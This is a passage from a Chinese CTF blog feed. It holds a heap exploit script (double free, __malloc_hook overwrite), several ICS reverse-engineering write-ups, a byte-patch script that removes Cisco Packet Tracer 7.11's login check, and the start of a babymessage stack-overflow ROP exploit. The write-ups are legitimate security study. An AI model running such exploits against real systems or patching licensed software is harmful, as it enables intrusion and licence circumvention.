class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,mes)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">"game's name:"</span>,str(name))    sla(<span class="hljs-string">'mes'</span>,str(mes))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index:'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x28</span>    mes = <span class="hljs-string">'2'</span> * <span class="hljs-number">23</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#2</span>    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#3</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#4</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#5</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#6</span>    free(<span class="hljs-number">3</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">5</span>)    <span class="hljs-comment"># debug()</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)    sl(<span class="hljs-string">'1'</span>*<span class="hljs-number">0x500</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0xb5dd</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#7</span>    add(<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0xb5dd</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#8</span>    free(<span class="hljs-number">6</span>)    free(<span class="hljs-number">7</span>)    free(<span class="hljs-number">6</span>)    add(<span class="hljs-number">0x68</span>,p8(<span class="hljs-number">0x90</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#9</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#10</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#11</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#12</span>    payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'104'</span>) <span class="hljs-comment">#13</span>    sa(<span class="hljs-string">'name'</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./pwn'</span>)        <span class="hljs-comment"># io = remote('39.101.184.181',10000)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)ru(<span class="hljs-string">'age'</span>)sl(<span class="hljs-string">'1'</span>)free(<span class="hljs-number">10</span>)free(<span class="hljs-number">11</span>)free(<span class="hljs-number">10</span>)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_addradd(<span class="hljs-number">0x68</span>,p64(malloc_hook),<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>)one_rec = <span class="hljs-number">0xf0364</span> + libc_addrpayload = <span class="hljs-string">'1'</span> * (<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>)+ p64(one_rec)add(<span class="hljs-number">0x68</span>,payload,<span class="hljs-string">'1'</span>)free(<span class="hljs-number">6</span>)free(<span class="hljs-number">6</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;羊城杯2020部分wp&quot;&gt;&lt;a href=&quot;#羊城杯2020部分wp&quot; class=&quot;headerlink&quot; title=&quot;羊城杯2020部分wp&quot;&gt;&lt;/a&gt;羊城杯2020部分wp&lt;/h1&gt;&lt;h2 id=&quot;re&quot;&gt;&lt;a href=&quot;#re&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020 “中能融合杯” 部分wp</title>
    <link href="http://chumen77.xyz/2020/09/12/2020%20%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%20%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/12/2020 “中能融合杯” 部分wp/</id>
    <published>2020-09-12T09:15:09.106Z</published>
    <updated>2020-09-17T09:36:44.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工控wp"><a href="#工控wp" class="headerlink" title="工控wp"></a>工控wp</h1><h2 id="ICS-8"><a href="#ICS-8" class="headerlink" title="ICS_8"></a><code>ICS_8</code></h2><p>就是一个算法的逆向。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> base64cypher_text = <span class="hljs-string">'HgoAVxEfdCRlPytBA1JSHiVOZW4VMURPcANETw=='</span>iv = struct.unpack(<span class="hljs-string">"I"</span>, <span class="hljs-string">'x1a0'</span>)[<span class="hljs-number">0</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(cypher_text,iv)</span>:</span>    cypher_text = base64.b64decode(cypher_text)    padding = <span class="hljs-number">4</span> - len(cypher_text) % <span class="hljs-number">4</span>    <span class="hljs-keyword">if</span> padding != <span class="hljs-number">0</span>:        cypher_text = cypher_text + <span class="hljs-string">"\x00"</span> * padding    l = cypher_text    crypher = struct.unpack(<span class="hljs-string">"I"</span>*(len(l)/<span class="hljs-number">4</span>),l)    datas = []    datas += [ decrypto(crypher[<span class="hljs-number">0</span>]) ^ iv ]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,len(crypher)):        datas += [decrypto(crypher[i]) ^ crypher[i<span class="hljs-number">-1</span>]]    <span class="hljs-keyword">return</span> datas<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypto</span><span class="hljs-params">(data)</span>:</span>    <span class="hljs-keyword">return</span> data ^ (data &gt;&gt; <span class="hljs-number">16</span>)datas = decode(cypher_text,iv)flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> datas:    flag += struct.pack(<span class="hljs-string">"I"</span>,i)<span class="hljs-keyword">print</span> flag</code></pre></div><h2 id="ICS-9"><a href="#ICS-9" class="headerlink" title="ICS_9"></a><code>ICS_9</code></h2><p>解压以后是一个img，但是发现是损坏的。</p><div class="hljs"><pre><code class="hljs bash">file ./ICS_9.img./ICS_9.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files)</code></pre></div><p>可以看到是ext4的文件。<br>然后可以用fsck修复一下：</p><div class="hljs"><pre><code class="hljs bash"> fsck.ext4 ./ICS_9.imge2fsck 1.42.13 (17-May-2015)ext2fs_open2: The ext2 superblock is corruptfsck.ext4: Superblock invalid, trying backup blocks..../ICS_9.img was not cleanly unmounted, check forced.Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary informationFree blocks count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#0 (6789, counted=488).</span>Fix&lt;y&gt;? yesFree blocks count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#1 (2006, counted=228).</span>Fix&lt;y&gt;? yesFree blocks count wrong (8795, counted=716).Fix&lt;y&gt;? yesFree inodes count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#0 (1269, counted=1262).</span>Fix&lt;y&gt;? yesFree inodes count wrong (2549, counted=2542).Fix&lt;y&gt;? yes./ICS_9.img: ***** FILE SYSTEM WAS MODIFIED *****./ICS_9.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/kfnyiY.png" srcset="/img/loading.gif" alt></p><p>然后进行挂载:</p><div class="hljs"><pre><code class="hljs bash">mkdir tmp2sudo mount ICS_9.img tmp2 ; ls -larth tmp2</code></pre></div><div class="hljs"><pre><code class="hljs bash"> binwalk fil.encScan Time:     2015-03-09 15:35:08Target File:   /tmp/wu/tmp/fil.encMD5 Checksum:  cb84f2cc7d776e83ebe0bd17efa163f4Signatures:    328DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12Ecat AE54[71A3j9[\22?/+u0</code></pre></div><p>Binwalk 一下，发现enc文件是openssl加密的文件，AE5文件是关于加密算法和密钥。</p><p>但是并不知道是哪种模式的加密和密钥的长度的加密，需要写一个脚本测试。<br>这是所有的可能：</p><div class="hljs"><pre><code class="hljs bash">-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192</code></pre></div><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash  </span> KEY=`cat AE5`   AES=<span class="hljs-string">"-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192"</span>   <span class="hljs-keyword">for</span> mode <span class="hljs-keyword">in</span> <span class="hljs-variable">$AES</span>   <span class="hljs-keyword">do</span>        openssl enc -d -<span class="hljs-keyword">in</span> fil.enc -out ./tmp3/fil<span class="hljs-string">"<span class="hljs-variable">$mode</span>"</span>.dec -k <span class="hljs-variable">$KEY</span> <span class="hljs-variable">$mode</span>   <span class="hljs-keyword">done</span></code></pre></div><div class="hljs"><pre><code class="hljs bash">sudo chmod +x ./1.shsudo sh 1.sh</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/X2q45Z.png" srcset="/img/loading.gif" alt></p><h2 id="ICS-11"><a href="#ICS-11" class="headerlink" title="ICS_11"></a><code>ICS_11</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/UypJgM.png" srcset="/img/loading.gif" alt><br>程序上来就告诉一下flag的格式，其中字符的内容是20位。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SzWq5u.png" srcset="/img/loading.gif" alt><br>向下走，也会发现有20的相关判断。<br>其上方有个大小判断大于10就退出了，但是flag是20位的，明显需要patch一下：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/6BsYEl.png" srcset="/img/loading.gif" alt></p><p>然后往下分析，发现你输入的东西会跟12位的<code>nemo_pwned_n</code>进行先比较一下，<br>接着:</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> ( v17 + v18 != 2842152358 || v18 - v17 != 989791556 )</code></pre></div><p>明显这是都需要进行满足的。<br>然后求解一下：</p><div class="hljs"><pre><code class="hljs bash">In [6]: hex(926180401)Out[6]: <span class="hljs-string">'0x37346431'</span> (v17)In [7]: hex(1915971957)Out[7]: <span class="hljs-string">'0x72336975'</span>. (v18)</code></pre></div><p>这样大数据进行判断，其实也是判断字符的，转码一下：</p><p><code>0x37346431:74d1  0x72336975 :r3iu</code><br>但是因为在内存中，其是小端序的，需要反转一下。<br>猜测flag就是<code>nemo_pwned_n1d47ui3r</code>。其长度正好就是20位。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/mDsH7W.png" srcset="/img/loading.gif" alt><br>经过验证的确是的。</p><h2 id="ICS-13"><a href="#ICS-13" class="headerlink" title="ICS_13"></a><code>ICS_13</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/gvE3nU.png" srcset="/img/loading.gif" alt><br>十分简单，自己输入的东西减去0x14，和<code>10445678951</code>进行一个个字节的比较，相等就ok。</p><div class="hljs"><pre><code class="hljs bash">key = <span class="hljs-string">'10445678951'</span>key = [ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key :    flag += chr(i+0x14)<span class="hljs-built_in">print</span>(flag)</code></pre></div><h2 id="ICS-2"><a href="#ICS-2" class="headerlink" title="ICS_2"></a><code>ICS_2</code></h2><p>先脱壳，esp定律脱壳。也可以用万能脱壳机进行脱。<br>由于给了提示，是需要找一个ip。很简单的思路就是直接找可疑ip。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OjHdLY.png" srcset="/img/loading.gif" alt></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y2gpgp.png" srcset="/img/loading.gif" alt></p><p>x32dbg直接断在这里，向下跟。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/2Nsxbj.png" srcset="/img/loading.gif" alt><br>发现可疑ip，提交就对了。</p><h2 id="ICS-14"><a href="#ICS-14" class="headerlink" title="ICS_14"></a><code>ICS_14</code></h2><p>程序就是很简单找到注册码。<br>邮箱可以乱输入，但是要保证<code>@</code> + <code>xx</code> + <code>.</code> + <code>xx</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f3gbCC.png" srcset="/img/loading.gif" alt><br>这里有函数进行控制判断。<br>如果不对就会说，邮箱不合法。<br>接着看流程：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/UDpOQ0.png" srcset="/img/loading.gif" alt></p><p>这块在判断一堆东西，推测就是注册码。<br>往上一看，可以看到这一条。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zigrXA.png" srcset="/img/loading.gif" alt><br>明显是ida无法识别，其是还是一个字符串。</p><p>然后就是一个个转字符串，以v12-v27整合一下,<code>BZ9dmq4c8g9G7bAY</code>出来这个。<br>并且可以看到判断就是16位。<br>然后进行输入判断:<br><img src="http://qiqianyun.chumen77.xyz/uPic/8zufHQ.png" srcset="/img/loading.gif" alt><br>就很简单成功拿到。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工控wp&quot;&gt;&lt;a href=&quot;#工控wp&quot; class=&quot;headerlink&quot; title=&quot;工控wp&quot;&gt;&lt;/a&gt;工控wp&lt;/h1&gt;&lt;h2 id=&quot;ICS-8&quot;&gt;&lt;a href=&quot;#ICS-8&quot; class=&quot;headerlink&quot; title=&quot;ICS_8&quot;&gt;
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="misc" scheme="http://chumen77.xyz/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>实战去除packet tracer登陆窗口</title>
    <link href="http://chumen77.xyz/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/"/>
    <id>http://chumen77.xyz/2020/09/07/实战去除packet tracer登陆窗口/</id>
    <published>2020-09-07T09:11:40.744Z</published>
    <updated>2020-09-12T09:14:20.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实战去除思科packet-tracer登陆窗口"><a href="#实战去除思科packet-tracer登陆窗口" class="headerlink" title="实战去除思科packet tracer登陆窗口"></a>实战去除思科packet tracer登陆窗口</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>专业课开设了路由交换这门课，其中要经常使用packet tracer这个软件，但是没有注册的话，每次登陆都需要等待15s，就尝试破解一下。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>破除等待的15s，最好直接去除掉登陆窗口。但是老师上课给我们演示过，有个吾爱破解的插件是直接破解掉登陆窗口的，就直接奔着这个目标去。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>win7 模拟器</li><li>packet tracer 7.11</li><li>x64dbg</li></ul><h2 id="破解过程记录"><a href="#破解过程记录" class="headerlink" title="破解过程记录"></a>破解过程记录</h2><h3 id="寻找突破口"><a href="#寻找突破口" class="headerlink" title="寻找突破口"></a>寻找突破口</h3><p>￼在弹出登陆界面时，最上方会有 <code>netacad.com Login</code>的字眼，先就选择这里作为关键字符串。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/K55z1P.jpg" srcset="/img/loading.gif" alt><br>在这个exe的程序下搜索字符串。<br><img src="http://qiqianyun.chumen77.xyz/uPic/H1st15.jpg" srcset="/img/loading.gif" alt><br>端口可疑字符串对应的汇编指令。</p><p>然后开始f9一直运行，在这个<code>netacad.com Login</code>，运行其后的软件会发现，的确开启了登陆的窗口。这样就可以确定，关键处就在这里。<br><img src="http://qiqianyun.chumen77.xyz/uPic/6Hr3Tw.png" srcset="/img/loading.gif" alt><br>向下看可以看到，一些登陆失败的字符串，那就无疑是这一块的函数控制着这个登陆窗口。</p><p>向上看可以看到，有几个小跳转，和一个大跳转，然后追过去可以发现，是可以绕过这些关键函数的。那就很简单了，尝试改成<code>jmp</code> 无条件跳转一下试一试。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f42dGL.png" srcset="/img/loading.gif" alt></p><p>然后直接运行一下，然后的确是成功了，去掉了登陆框。</p><p>然后进行保存补丁，替换主程序即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OikyWs.png" srcset="/img/loading.gif" alt></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>的确是找到了关键处，感觉整个过程还是很简单的，由于前人经验就是从登陆界面下手的，我也是直接跟随这个思路操作。在完工以后，尝试去搞一下15s哪里的验证，想点一下直接变为0s，可以点击确认，发现是的确麻烦也没有成功就放弃了。</p><h2 id="半自动化打补丁"><a href="#半自动化打补丁" class="headerlink" title="半自动化打补丁"></a>半自动化打补丁</h2><p>不太会写c，用python 写了打补丁的程序，确保本机有python2的运行环境。然后把脚本放在其安装路径的bin目录下，运行即可。</p><p>也可以把程序拖出来，打完补丁后替换原来的程序即可。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> os<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">WriteFile</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'PacketTracer7.exe'</span>,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:         dt = f.read()    dt = dt[:<span class="hljs-number">0x17a5245</span>]+<span class="hljs-string">'\xe9\xee\x04\x00\x00\x90'</span>+dt[<span class="hljs-number">0x17a524b</span>:]    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'PacketTracer7.exe'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:        f.write(dt)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:WriteFile()</code></pre></div><p>针对的只是7.11。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;实战去除思科packet-tracer登陆窗口&quot;&gt;&lt;a href=&quot;#实战去除思科packet-tracer登陆窗口&quot; class=&quot;headerlink&quot; title=&quot;实战去除思科packet tracer登陆窗口&quot;&gt;&lt;/a&gt;实战去除思科packet trac
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2020部分题目</title>
    <link href="http://chumen77.xyz/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/24/强网杯2020部分题目/</id>
    <published>2020-08-24T02:34:05.216Z</published>
    <updated>2020-09-23T12:02:35.653Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯2020-部分题目"><a href="#强网杯2020-部分题目" class="headerlink" title="强网杯2020 部分题目"></a>强网杯2020 部分题目</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr"> RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr"> Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr"> NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr"> PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3fe000)</span></code></pre></div><p>基本保护不算多。</p><p>是一个伪堆题。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在 <code>leave_message(v1)</code>函数这里的v1上来取值就是16</p><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">leave_message</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a1)</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ST14_4</span>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"message: "</span>);  v1 = read(<span class="hljs-number">0</span>, &amp;v3, a1);  <span class="hljs-built_in">strncpy</span>(buf, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;v3, v1);  buf[v1] = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"done!\n"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>进入以后可以发现，v3是只有8字节大小的，可以溢出8字节，可以覆盖到rbp。</p><h5 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h5><div class="hljs"><pre><code class="hljs undefined">.text:<span class="hljs-number">0000000000400985</span> ; <span class="hljs-number">22</span>:         <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">256</span> ).text:<span class="hljs-number">0000000000400985</span>                 cmp     [rbp+var_4], <span class="hljs-number">100</span>h.text:<span class="hljs-number">000000000040098</span>C                 jle     short loc_400995.text:<span class="hljs-number">000000000040098</span>E ; <span class="hljs-number">23</span>:           v1 = <span class="hljs-number">256</span>;.text:<span class="hljs-number">000000000040098</span>E                 mov     [rbp+var_4], <span class="hljs-number">100</span>h.text:<span class="hljs-number">0000000000400995</span> ; <span class="hljs-number">24</span>:         leave_message(v1);</code></pre></div><p>在进入<code>leave_message(v1)</code>前v1有一个对于0x100大小的判断，要是v1大于0x100就给设置为0x100。这就可以实现栈溢出，进行rop。</p><p>怎么控制v1：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span></code></pre></div><p>可以明显看到v1在rbp-4的地址，然后rbp，也可以进行溢出覆盖，覆盖到合适的地方后，保障-4后，有个int大小的大于等于0x100的值即可。</p><p>这个合适地址，可以从<code>leave_name()</code> 下手，因为其往bss段读了值。</p><div class="hljs"><pre><code class="hljs undefined">byte_6010D0[(signed <span class="hljs-built_in">int</span>)read(<span class="hljs-number">0</span>, byte_6010D0, <span class="hljs-number">4</span>uLL)] = <span class="hljs-number">0</span>;</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul><li>构造rop链，泄漏出libc的地址，返回start，让程序重新跑起来，清理栈</li><li>再次利用，控制ret address 为<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babymessage'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.170.202'</span>,<span class="hljs-number">21342</span>)    libc = elf.libc    libc = ELF(<span class="hljs-string">'./libc-2.27.so'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># 